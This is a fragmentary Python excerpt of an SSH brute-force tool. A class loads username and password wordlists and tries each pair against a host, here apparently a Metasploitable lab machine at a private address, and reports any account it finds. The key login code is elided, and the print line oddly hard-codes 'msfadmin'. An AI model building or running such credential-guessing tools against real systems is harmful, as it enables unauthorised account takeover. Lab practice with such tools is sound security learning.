...
class SSHBruteForcer:
    def __init__(self, usernames: str, wordlist:str) -> None:
        ...
        if not os.path.isfile(wordlist):
            print("The worlist file was not found!")
            sys.exit(404)
    ...
    def Run(self, host:str) -> None:
        for user in self._users:
            ...
            for password in self._passwords:
                ...
                if respond:
                    print(f"ACCOUNT FOUND: [ssh] Host: {host} User: msfadmin {user} Password: {password}")
                    break

brf = SSHBruteForcer("Dictionaries/users.txt", "Dictionaries/wordlist.txt")
brf.Run("192.168.0.103")
